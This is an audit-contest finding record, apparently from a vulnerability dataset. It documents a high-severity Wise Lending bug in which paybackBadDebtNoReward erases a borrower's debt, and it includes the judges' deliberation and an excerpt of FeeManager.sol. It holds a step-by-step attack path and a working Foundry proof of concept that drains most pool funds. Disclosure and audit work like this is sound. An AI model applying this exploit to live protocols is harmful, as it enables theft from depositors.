{
  "Title": "[H-02] User can erase their position debt for free",
  "Content": "\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727>\n\n### Vulnerability details\n\nWhen the pool token stops being used in the position, the `_removePositionData` function is called. However, it assumes that `poolToken` that is passed as a parameter always exists in user token array, which is not always the case. In the case of function `FeeManager.paybackBadDebtNoReward()`, which indirectly calls `_removePositionData`, insufficient validation doesn't check if repay token is in user array, which results in zeroing out information about user debt.\n\n### Impact\n\nFree elimination of user debt.\n\n### Proof of Concept\n\nFirst, let's see how `MainHelper._removePositionData()` works:\n\n```javascript\n    function _removePositionData(\n        uint256 _nftId,\n        address _poolToken,\n        function(uint256) view returns (uint256) _getPositionTokenLength,\n        function(uint256, uint256) view returns (address) _getPositionTokenByIndex,\n        function(uint256, address) internal _deleteLastPositionData,\n        bool isLending\n    )\n        private\n    {\n        uint256 length = _getPositionTokenLength(\n            _nftId\n        );\n\n        if (length == 1) {\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            return;\n        }\n\n        uint8 i;\n        uint256 endPosition = length - 1;\n\n        while (i < length) {\n\n            if (i == endPosition) {\n                _deleteLastPositionData(\n                    _nftId,\n                    _poolToken\n                );\n\n                break;\n            }\n\n            if (_getPositionTokenByIndex(_nftId, i) != _poolToken) {\n                unchecked {\n                    ++i;\n                }\n                continue;\n            }\n\n            address poolToken = _getPositionTokenByIndex(\n                _nftId,\n                endPosition\n            );\n\n            isLending == true\n                ? positionLendTokenData[_nftId][i] = poolToken\n                : positionBorrowTokenData[_nftId][i] = poolToken;\n\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            break;\n        }\n    }\n```\n\nSo, `_poolToken` sent in parameter is not checked if:\n\n1. The position consists of only one token. Then the token is removed, no matter if it's `_poolToken` or not.\n2. No token was found during the position token iteration. In which case, the last token is removed, no matter if it's `_poolToken` or not.\n\nThis function is called in `MainHelper._corePayback()`, which in turn is called in `FeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback()`. The important factor is that `paybackBadDebtNoReward()` doesn't check if position utilizes  `_paybackToken` passed by the caller and allows it to pass any token. The only prerequisite is that `badDebtPosition[_nftId]` has to be bigger than `0`:\n\n```javascript\n    function paybackBadDebtNoReward(\n        uint256 _nftId,\n        address _paybackToken,\n        uint256 _shares\n    )\n        external\n        returns (uint256 paybackAmount)\n    {\n        updatePositionCurrentBadDebt(\n            _nftId\n        );\n\n        if (badDebtPosition[_nftId] == 0) {\n            return 0;\n        }\n\n        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {\n            revert PoolNotActive();\n        }\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            _paybackToken,\n            _shares\n        );\n\n        WISE_LENDING.corePaybackFeeManager(\n            _paybackToken,\n            _nftId,\n            paybackAmount,\n            _shares\n        );\n\n        _updateUserBadDebt(\n            _nftId\n        );\n\t\t// [...]\n```\n\nWith these pieces of information, we can form following attack path:\n\n1. Prepare a big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.\n2. Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done, for example, before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.\n3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.\n4. Because there is non-zero bad debt, the check will pass, and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:\n\n```javascript\n    function _corePayback(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount,\n        uint256 _shares\n    )\n        internal\n    {\n        _updatePoolStorage(\n            _poolToken,\n            _amount,\n            _shares,\n            _increaseTotalPool,\n            _decreasePseudoTotalBorrowAmount,\n            _decreaseTotalBorrowShares\n        );\n\n        _decreasePositionMappingValue(\n            userBorrowShares,\n            _nftId,\n            _poolToken,\n            _shares\n        );\n\n        if (userBorrowShares[_nftId][_poolToken] > 0) {\n            return;\n        }\n\n        _removePositionData({\n            _nftId: _nftId,\n            _poolToken: _poolToken,\n            _getPositionTokenLength: getPositionBorrowTokenLength,\n            _getPositionTokenByIndex: getPositionBorrowTokenByIndex,\n            _deleteLastPositionData: _deleteLastPositionBorrowData,\n            isLending: false\n        });\n```\n\n5. Inside `_removePositionData`, because position length is 1, no checks to confirm if the token address matches will be performed:\n\n```javascript\n        uint256 length = _getPositionTokenLength(\n            _nftId\n        );\n\n        if (length == 1) {\n            _deleteLastPositionData(\n                _nftId,\n                _poolToken\n            );\n\n            return;\n        }\n```\n\n6. This means that all information about user borrows are deleted. Meaning, that now system thinks the user has `$1M` collateral, and no debt. Which means that the attacker just stole the entire borrowed amount.\n\n### Recommended Mitigation Steps\n\nAdd verification if the token that is passed to `_removePositionData()` exists in user tokens. If not, revert the transaction.\n\n### Assessed type\n\nInvalid Validation\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270):**\n > Double checking line of reasoning fails when user deposits large amount and then borrows.\n> \n>> 1. Prepare big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.\n>> 2. Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done for example before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.\n>> 3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.\n>> 4. Because there is non-zero bad debt, the check will pass, and and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:\n> \n> Comment:\n> 1. Ok say big position has `nftId` = 1.\n> 2. Ok say small position has `nftId` = 2.\n>\n> `nftId` 2 now takes more collateral and borrows max:\n> then calls `paybackBadDebtNoReward` with `nftId` 2.\n> \n> But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),\n>\n> This line here:\n>\n> ```\n> updatePositionCurrentBadDebt(\n>             _nftId\n>         );\n> ```\n>\n> in the beginning will set `badDebtPosition[_nft]` to `0` meaning it will exit after this line:\n>\n> ```\n> if (badDebtPosition[_nftId] == 0) {\n>     return 0;\n>  }\n>  ```\n> \n> and no harm done.\n\n\n**[deliriusz (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2026861525):**\n > @Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in `_removePositionData()`. I managed to not use very big position and a single token, which makes this issue even easier to perform.\n> \n> PoC provided below does the following:\n> 1. Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.\n> 2. Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.\n> 3. When bad debt repayment is triggered for a token that user didn't use, `_removePositionData()` removes last token in user borrow tokens. In this case that means that the user doesn't have any tokens in his debt tokens listed.\n> 4. User borrows 95% of ALL ETH that the protocol holds. It's possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.\n> 5. At the end I verified that the user really got the funds, which proves that the issue is real.\n>\n><details>\n> \n> ```javascript\n> // SPDX-License-Identifier: -- WISE --\n> \n> pragma solidity =0.8.24;\n> \n> import \"./WiseLendingBaseDeployment.t.sol\";\n> \n> contract DebtClearTest is BaseDeploymentTest {\n>     address borrower = address(uint160(uint(keccak256(\"alice\"))));\n>     address lender = address(uint160(uint(keccak256(\"bob\"))));\n>     address lender2 = address(uint160(uint(keccak256(\"bob2\"))));\n> \n>     uint256 depositAmountETH = 100 ether; // 10 ether\n>     uint256 depositAmountToken = 10 ether; // 10 ether\n>     uint256 borrowAmount = 5e18; // 5 ether\n> \n>     uint256 nftIdLiquidator; // nftId of lender\n>     uint256 nftIdLiquidatee; // nftId of borrower\n> \n>     uint256 debtShares;\n> \n>     function _setupIndividualTest() internal override {\n>         _deployNewWiseLending(false);\n> \n>         // set token value for simple calculations\n>         MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH\n>         assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());\n>         vm.stopPrank();\n>         \n>         // fund lender and borrower\n>         vm.deal(lender, depositAmountETH);\n>         vm.deal(lender2, depositAmountETH);\n>         deal(address(MOCK_WETH), lender, depositAmountETH);\n>         deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);\n>         deal(address(MOCK_ERC20_1), lender, depositAmountToken * 2);\n>     }\n> \n>     function testRemovingToken() public {\n>         IERC20 WETH = IERC20(LENDING_INSTANCE.WETH_ADDRESS());\n>                 // lender supplies ETH\n>         vm.startPrank(lender);\n> \n>         nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();\n> \n>         // deposit 100 ether into the pool\n>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);\n> \n>         vm.stopPrank();\n> \n>         // prank second provider to make sure that the borrower is able to\n>         // steal everyone's funds later\n>         vm.startPrank(lender2);\n> \n>         uint nftIdfundsProvider = POSITION_NFTS_INSTANCE.mintPosition();\n> \n>         // deposit 100 ether into the pool\n>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdfundsProvider);\n> \n>         vm.stopPrank();\n> \n>         // borrower supplies collateral token and borrows ETH\n>         vm.startPrank(borrower);\n> \n>         MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);\n> \n>         nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();\n>         \n>         vm.warp(\n>             block.timestamp + 10 days\n>         );\n> \n>         LENDING_INSTANCE.depositExactAmount( // supply collateral\n>             nftIdLiquidatee, \n>             address(MOCK_ERC20_2), \n>             10\n>         );\n> \n>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH\n> \n>         vm.stopPrank();\n> \n>         // shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt\n>         // second is maintaining small position that gives no incentive to liquidate it.\n>         vm.prank(MOCK_DEPLOYER);\n>         MOCK_CHAINLINK_2.setValue(0.3 ether);\n> \n>         // borrower gets partially liquidated\n>         vm.startPrank(lender);\n> \n>         MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);\n> \n>         LENDING_INSTANCE.liquidatePartiallyFromTokens(\n>             nftIdLiquidatee,\n>             nftIdLiquidator, \n>             address(MOCK_WETH),\n>             address(MOCK_ERC20_2),\n>             debtShares * 2e16 / 1e18 + 1 \n>         );\n> \n>         vm.stopPrank();\n> \n>         // global and user bad debt is increased\n>         uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();\n>         uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);\n> \n>         assertGt(totalBadDebt, 0); \n>         assertGt(userBadDebt, 0);\n>         assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same\n> \n>         vm.startPrank(lender);\n> \n>         MOCK_ERC20_1.approve(address(LENDING_INSTANCE), type(uint256).max);\n>         MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);\n>         MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);\n>         \n>         // check how much tokens the position that will be liquidated has\n>         uint256 lb = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n> \n>         assertEq(lb, 1);\n> \n>         uint256 ethValueBefore = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n> \n>         console.log(\"ethBefore \", ethValueBefore);\n> \n>         // **IMPORTANT** this is the core of the issue\n>         // When bad debt occurs, there are 2 critical checks missing:\n>         // 1. that the amount to repay is bigger than 0\n>         // 2. that the token to repay bad debt has the bad debt for user\n>         // This allows to remove any token from the list of user borrow tokens,\n>         // because of how finding token to remove algorithm is implemented:\n>         // it iterates over all the tokens and if it doesn't find matching one\n>         // until it reaches last, it wrongly assumes that the last token is the\n>         // one that should be removed.\n>         // And not checking for amount of repayment allows to skip Solidity underflow \n>         // checks on diminishing user bad debt.\n>         FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(\n>             nftIdLiquidatee, \n>             address(MOCK_ERC20_1), // user doesn't have debt in this token\n>             0\n>         );\n> \n>         uint256 ethValueAfter = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n>         uint256 ethWethValueAfter = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(WETH)\n>         );\n>         console.log(\"ethAfter \", ethValueAfter);\n> \n>         // assert that the paybackBadDebtNoReward removed token that it shouldn't\n>         uint256 la = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n>         assertEq(la, 0);\n> \n>         vm.stopPrank();\n>         \n>         uint lendingWethBalance = WETH.balanceOf(address(LENDING_INSTANCE));\n> \n>         console.log(\"lb \", lendingWethBalance);\n>         console.log(\"bb \", borrower.balance);\n> \n>         vm.startPrank(borrower);\n> \n>         // borrow 95% of ALL ETH that the protocol possesses\n>         // this works, because when calculating health check of a position\n>         // it iterates through `getPositionBorrowTokenLength()` - and we\n>         // were able to remove it.\n>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, WETH.balanceOf(address(LENDING_INSTANCE)) * 95 / 100); // borrow ETH\n> \n>         console.log(\"lb \", WETH.balanceOf(address(LENDING_INSTANCE)));\n>         console.log(\"ba \", borrower.balance);\n> \n>         // make sure that borrow tokens were not increased\n>         uint256 la2 = LENDING_INSTANCE.getPositionBorrowTokenLength(\n>             nftIdLiquidatee\n>         );\n>         assertEq(la2, 0);\n> \n>         // verify that ~95% were taken from the pool and borrower received them\n>         assertLt(WETH.balanceOf(address(LENDING_INSTANCE)), lendingWethBalance * 6 / 100);\n>         assertGt(borrower.balance, lendingWethBalance * 94 / 100);\n> \n>         uint256 ethValueAfter2 = SECURITY_INSTANCE.getETHBorrow(\n>             nftIdLiquidatee,\n>             address(MOCK_ERC20_2)\n>         );\n>         console.log(\"ethAfter2 \", ethValueAfter2);\n>         vm.stopPrank();\n> \n>         // borrowing doesn't increase user borrow\n>         assertEq(ethValueAfter, ethValueAfter2);\n>     }\n> }\n> ```\n> \n> </details>\n>\n> At the end of the test, it's verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027095241):**\n > Confirmed the test passes. \n >\n> ```\n> [PASS] testRemovingToken() (gas: 2242360)\n> Logs:\n>   ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239\n>   POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9\n>   LATEST RESPONSE 1000000000000000000\n>   ethBefore  300000000000000000\n>   ethAfter  300000000000000000\n>   lb  195100000000000000001\n>   bb  5000000000000000000\n>   lb  9755000000000000001\n>   ba  190345000000000000000\n>   ethAfter2  300000000000000000\n> ```\n> \n> The likelihood/impact are in line with high severity.\n> A POC was not initially provided, but the step by step given is deemed sufficient.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027309902):**\n > @Foon256 or @vonMangoldt - can check this again I think. I'll check what kind of code change we need to add in order to prevent this scenario.\n\n**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2029781697):**\n > The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don't know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2030208760):**\n > The warden's identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.\n\n**[Alex the Entreprenerd (Appellate Court lead judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2056792265):**\n > ### Summary of the issue\n >\n> Due to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.\n> \n> ### Alex the Entreprenerd’s (Appellate Court lead judge) input\n>\n> Facts:\n> 1. `paybackBadDebtNoReward` can be called with non existent `paybacktoken`.\n> 2. First `poolToken` bad debt position will be deleted by default.\n> 3. Remove position in the original submission is not fully clear, but is implicitly mentioning using `_deleteLastPositionBorrowDatafor` `_removePositionData`.\n> 4. This will forgive the bad debt and break the system.\n> 5. Was disputed due to this.\n> \n> This asserts that the attack cannot be done atomically, that's true.\n>\n> 6. The original submission explains that, due to generating bad debt.\n> \n> I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around \"proper\" vs \"malicious\" liquidators is not a major decision factor.\n> \n> I would like to add that the original submission is passable but should have done a better job at:\n> - Using only necessary snippets, with comments and tags.\n> - Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).\n> \n> I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.\n>\n> ### hickuphh3's (judge 2) input\n>\n> This issue should’ve been accompanied with a POC, then there would be no disambiguity over its validity and severity.\n> \n> I agree with the judge’s assessment. The warden correctly identified the root cause of lacking input validation of `_poolToken`, which allows `_removePositionData` to incorrectly remove borrowed positions, thus erasing that user’s debt. \n> \n> The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.\n> \n> I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.\n> \n> Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue. \n> \n> ### LSDan’s (judge 3) Input\n> I think this one should be held as invalid due to [this ruling](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-standardization-of-additional-warden-output-during-qa) in Decisions from the inaugural Supreme Court session.\n>\n> As far as I can see, the swaying information was the POC added after the submission deadline. It doesn't matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> I don't think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real token. That was identified in the original submission.\n> \n> I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn't justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.\n> \n> **LSDan (judge 3) commented:** \n>Apologies guys... didn't read it carefully enough on the first pass. I've re-evaluated and while I don't like the quality of the original submission and would probably have invalidated it myself, I'm willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.\n> \n> ### Additional input from the Sponsor (Requested by the Lead Judge) via discord\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> For issue 215, I'd like to ask you what you think was invalid about the first submission and what's specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.\n> \n> **Foon (Wise Lending):**\n> Referenced the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270).\n>\n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn't the attacker be able to apply the attack mentioned in the original submission?\n> \n> **hodldoor (Wise Lending) commented:**\n> They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?\n> \n> **hodldoor (Wise Lending) commented:**\n> Not for liquidation.<br>\n> For payingback edit: `paybackBadDebtNoReward` only works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn't is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.\n> \n> **Foon (Wise Lending) commented:**\n> For payingback bad debt positions with `paybackBadDebtNoReward()`, we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive with `paybackBadDebtForToken()` or a generous donor. The team can pay it back for free with `paybackBadDebtNoReward()`. `paybackBadDebtForToken()` is only possible if there is some collateral left in the bad debt position nft.\n> \n> **hodldoor (Wise Lending) commented:**\n> the for free part is technically not needed anymore anyway since we opened paying back for everyone\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> Ok. What do you think changed from the original submission and the POC that makes the finding different?\n> \n> **hodldoor (Wise Lending) commented:**\n> You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it's an `expectedValue` question.\n>\n> Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he's lucky that he doesn't get liquidated within a 10-20% price difference and gets to call the other function first.\n> So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don't get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.\n>\n>The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it's highly minus -ev to do that.\n> \n> **Alex The Entreprenerd (Appellate Court lead judge) commented:**\n> Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?\n> \n> Shouldn't the system ideally prevent this scenario from ever being possible?\n> \n> **The Wise Admiral (Wise Lending) commented:**\n> I'll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about \"shouldn't the system prevent\"\n> \n> I do not believe our position on this finding is that it's objectively invalid. In fact, I'm sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.\n>\n> **hodldoor (Wise Lending) commented:**\n> The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it's in time relating to liquidation incentive vs distance between collateral in debt in percentage. That's why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn't matter by whom).\n> \n> ### Deliberation\n> \n> We believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.\n> \n> While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.\n> \n> For this reason we believe the finding to be a High Severity finding.\n> \n> ### Additional Context by the Lead Judge\n> \n> We can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where “No stone is left unturned”.\n> \n> I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).\n> \n> But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2082895779):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-02-wise-lending",
  "Code": [
    {
      "filename": "contracts/FeeManager/FeeManager.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\n/**\n * @author Christoph Krpoun\n * @author René Hochmuth\n * @author Vitally Marinchenko\n */\n\nimport \"./FeeManagerHelper.sol\";\n\n/**\n * @dev Purpose of this contract is to organize fee distribution from wiseLending.\n * The feeManager aquires fee token in form of shares from each pool and can call them\n * with \"claimWiseFees()\" for each pool.\n *\n * Furthermore, this contracts has two different incentive\n * structures which can be used to bootstrap the WISE ecosystem (beneficial and incnetiveOwner roles).\n *\n * Additionally, this contract keeps track of the bad debt of each postion and has a simple mechanism\n * to pay them back via incentives. The incentive amount is funded by the gathered fees.\n */\n\ncontract FeeManager is FeeManagerHelper {\n\n    constructor(\n        address _master,\n        address _aaveAddress,\n        address _wiseLendingAddress,\n        address _oracleHubAddress,\n        address _wiseSecurityAddress,\n        address _positionNFTAddress\n    )\n        DeclarationsFeeManager(\n            _master,\n            _aaveAddress,\n            _wiseLendingAddress,\n            _oracleHubAddress,\n            _wiseSecurityAddress,\n            _positionNFTAddress\n        )\n    {}\n\n    /**\n     * @dev Allows to adjust the paid out incentive\n     * percentage for user to reduce bad debt.\n     */\n    function setRepayBadDebtIncentive(\n        uint256 _percent\n    )\n        external\n        onlyMaster\n    {\n        _checkValue(\n            _percent\n        );\n\n        paybackIncentive = _percent;\n    }\n\n    /**\n     * @dev Maps underlying token with corresponding aToken.\n     * Sets bool to identify pool token as aToken.\n     */\n    function setAaveFlag(\n        address _poolToken,\n        address _underlyingToken\n    )\n        external\n        onlyMaster\n    {\n        _setAaveFlag(\n            _poolToken,\n            _underlyingToken\n        );\n    }\n\n    /**\n     * @dev Bulk function for setting aave flag for multiple pools.\n     */\n    function setAaveFlagBulk(\n        address[] calldata _poolTokens,\n        address[] calldata _underlyingTokens\n    )\n        external\n        onlyMaster\n    {\n        uint256 i;\n        uint256 l = _poolTokens.length;\n\n        while (i < l) {\n            _setAaveFlag(\n                _poolTokens[i],\n                _underlyingTokens[i]\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Function to adjust pool fee. Fee can not be greater than 100%\n     * or lower than 1%. Can be adjusted for each pool individually.\n     */\n    function setPoolFee(\n        address _poolToken,\n        uint256 _newFee\n    )\n        external\n        onlyMaster\n    {\n        _checkValue(\n            _newFee\n        );\n\n        WISE_LENDING.setPoolFee(\n            _poolToken,\n            _newFee\n        );\n\n        emit PoolFeeChanged(\n            _poolToken,\n            _newFee,\n            block.timestamp\n        );\n    }\n\n    /**\n    * @dev Function to adjust pool fees in bulk. Fee for each pool can not be\n    * greater than 100% or lower than 1%. Can be adjusted for each pool individually.\n    */\n    function setPoolFeeBulk(\n        address[] calldata _poolTokens,\n        uint256[] calldata _newFees\n    )\n        external\n        onlyMaster\n    {\n        uint256 i;\n        uint256 l = _poolTokens.length;\n\n        while (i < l) {\n\n            _checkValue(\n                _newFees[i]\n            );\n\n            WISE_LENDING.setPoolFee(\n                _poolTokens[i],\n                _newFees[i]\n            );\n\n            emit PoolFeeChanged(\n                _poolTokens[i],\n                _newFees[i],\n                block.timestamp\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Function to propose new incentive master. This role can increase\n     * the incentive amount for both incentive mappings. These are two roles\n     * for incentivising external persons e.g. developers.\n     */\n    function proposeIncentiveMaster(\n        address _proposedIncentiveMaster\n    )\n        external\n        onlyIncentiveMaster\n    {\n        if (_proposedIncentiveMaster == ZERO_ADDRESS) {\n            revert ZeroAddress();\n        }\n\n        proposedIncentiveMaster = _proposedIncentiveMaster;\n\n        emit IncentiveMasterProposed(\n            _proposedIncentiveMaster,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Claim proposed incentive master by proposed entity.\n     */\n    function claimOwnershipIncentiveMaster()\n        external\n    {\n        if (msg.sender != proposedIncentiveMaster) {\n            revert NotAllowed();\n        }\n\n        incentiveMaster = proposedIncentiveMaster;\n        proposedIncentiveMaster = ZERO_ADDRESS;\n\n        emit ClaimedOwnershipIncentiveMaster(\n            incentiveMaster,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Increase function for increasing incentive amount for entity A.\n     * Only callable by incentive master.\n     */\n    function increaseIncentiveA(\n        uint256 _value\n    )\n        external\n        onlyIncentiveMaster\n    {\n        incentiveUSD[incentiveOwnerA] += _value;\n\n        emit IncentiveIncreasedA(\n            _value,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Increase function for increasing incentive amount for entity B.\n     * Only callable by incentive master.\n     */\n    function increaseIncentiveB(\n        uint256 _value\n    )\n        external\n        onlyIncentiveMaster\n    {\n        incentiveUSD[incentiveOwnerB] += _value;\n\n        emit IncentiveIncreasedB(\n            _value,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function to claim all gathered incetives.\n     */\n    function claimIncentivesBulk()\n        external\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = getPoolTokenAddressesLength();\n\n        while (i < l) {\n\n            tokenAddress = poolTokenAddresses[i];\n\n            if (isAaveToken[tokenAddress] == true) {\n                tokenAddress = underlyingToken[\n                    tokenAddress\n                ];\n            }\n\n            claimIncentives(\n                tokenAddress\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit ClaimedIncentivesBulk(\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Claims gathered incentives for a specific token.\n     */\n    function claimIncentives(\n        address _feeToken\n    )\n        public\n    {\n        uint256 amount = gatheredIncentiveToken[msg.sender][_feeToken];\n\n        if (amount == 0) {\n            revert 